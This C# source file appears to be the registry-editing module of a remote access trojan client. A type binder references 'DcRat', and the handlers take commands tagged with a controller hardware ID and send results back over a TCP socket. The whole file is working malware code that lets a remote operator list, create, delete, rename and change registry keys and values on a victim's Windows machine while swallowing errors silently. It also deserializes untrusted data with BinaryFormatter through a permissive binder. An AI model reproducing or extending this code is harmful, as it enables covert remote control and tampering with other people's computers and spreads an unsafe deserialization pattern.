using System;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using Client.Helper.RegManager;
using MessagePack;
using Microsoft.Win32;
using static Client.Helper.RegManager.RegistrySeeker;

namespace Client.HandlePacket
{
    public static class HandleRegEdit
    {
        public static void LoadKey(string RootKeyName, string Controler_HWID)
        {
            try
            {
                var seeker = new RegistrySeeker();
                seeker.BeginSeeking(RootKeyName);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "LoadKey";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("RootKey").AsString = RootKeyName;
                msgpack.ForcePathObject("Matches").SetAsBytes(Serialize(seeker.Matches));
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }


        public static void CreateKey(string ParentPath, string Controler_HWID)
        {
            try
            {
                RegistryEditor.CreateRegistryKey(ParentPath, out var newKeyName, out var errorMsg);
                var Match = new RegSeekerMatch
                {
                    Key = newKeyName,
                    Data = RegistryKeyHelper.GetDefaultValues(),
                    HasSubKeys = false
                };

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "CreateKey";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
                msgpack.ForcePathObject("Match").SetAsBytes(Serialize(Match));
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }

        public static void DeleteKey(string KeyName, string ParentPath, string Controler_HWID)
        {
            try
            {
                RegistryEditor.DeleteRegistryKey(KeyName, ParentPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "DeleteKey";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
                msgpack.ForcePathObject("KeyName").AsString = KeyName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }

        public static void RenameKey(string OldKeyName, string NewKeyName, string ParentPath, string Controler_HWID)
        {
            try
            {
                RegistryEditor.RenameRegistryKey(OldKeyName, NewKeyName, ParentPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "RenameKey";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("rootKey").AsString = ParentPath;
                msgpack.ForcePathObject("oldName").AsString = OldKeyName;
                msgpack.ForcePathObject("newName").AsString = NewKeyName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }

        public static void CreateValue(string KeyPath, string Kindstring, string Controler_HWID)
        {
            var newKeyName = "";
            var Kind = RegistryValueKind.Unknown;
            switch (Kindstring)
            {
                case "0":
                {
                    Kind = RegistryValueKind.Unknown;
                    break;
                }
                case "1":
                {
                    Kind = RegistryValueKind.String;
                    break;
                }
                case "2":
                {
                    Kind = RegistryValueKind.ExpandString;
                    break;
                }
                case "3":
                {
                    Kind = RegistryValueKind.Binary;
                    break;
                }
                case "4":
                {
                    Kind = RegistryValueKind.DWord;
                    break;
                }
                case "7":
                {
                    Kind = RegistryValueKind.MultiString;
                    break;
                }
                case "11":
                {
                    Kind = RegistryValueKind.QWord;
                    break;
                }
            }

            try
            {
                RegistryEditor.CreateRegistryValue(KeyPath, Kind, out newKeyName, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "CreateValue";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
                msgpack.ForcePathObject("Kindstring").AsString = Kindstring;
                msgpack.ForcePathObject("newKeyName").AsString = newKeyName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }

        public static void DeleteValue(string KeyPath, string ValueName, string Controler_HWID)
        {
            try
            {
                RegistryEditor.DeleteRegistryValue(KeyPath, ValueName, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "DeleteValue";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
                msgpack.ForcePathObject("ValueName").AsString = ValueName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }

        public static void RenameValue(string OldValueName, string NewValueName, string KeyPath, string Controler_HWID)
        {
            try
            {
                RegistryEditor.RenameRegistryValue(OldValueName, NewValueName, KeyPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "RenameValue";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
                msgpack.ForcePathObject("OldValueName").AsString = OldValueName;
                msgpack.ForcePathObject("NewValueName").AsString = NewValueName;
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }

        public static void ChangeValue(RegValueData Value, string KeyPath, string Controler_HWID)
        {
            try
            {
                RegistryEditor.ChangeRegistryValue(Value, KeyPath, out var errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "ChangeValue";
                msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
                msgpack.ForcePathObject("Value").SetAsBytes(Serialize(Value));
                Program.TCP_Socket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception)
            {
                //Packet.Error(ex.Message);
            }
        }


        public static byte[] Serialize(RegSeekerMatch[] Matches)
        {
            return Matches.Serialize();
        }

        public static byte[] Serialize(RegSeekerMatch Matche)
        {
            return Matche.Serialize();
        }

        public static byte[] Serialize(RegValueData Value)
        {
            return Value.Serialize();
        }

        public static RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            var Value = bytes.Deserialize<RegValueData>();
            return Value;
        }
    }

    internal sealed class Binder : SerializationBinder
    {
        public override Type BindToType(string assemblyName, string typeName)
        {
            Type typeToDeserialize = null;

            var currentAssembly = Assembly.GetExecutingAssembly().FullName;
            typeName = typeName.Replace("DcRat.Helper", "Client.Helper.RegManager");
            assemblyName = currentAssembly;

            typeToDeserialize = Type.GetType($"{typeName}, {assemblyName}");
            return typeToDeserialize;
        }
    }

    public static class Serializer
    {
        public static byte[] Serialize<T>(this T @object)
        {
            using (var ms = new MemoryStream())
            {
                new BinaryFormatter().Serialize(ms, @object);
                return ms.ToArray();
            }
        }

        public static T Deserialize<T>(this byte[] byteArray)
        {
            using (var ms = new MemoryStream(byteArray))
            {
                return (T) new BinaryFormatter
                {
                    Binder = new Binder()
                }.Deserialize(ms);
            }
        }
    }
}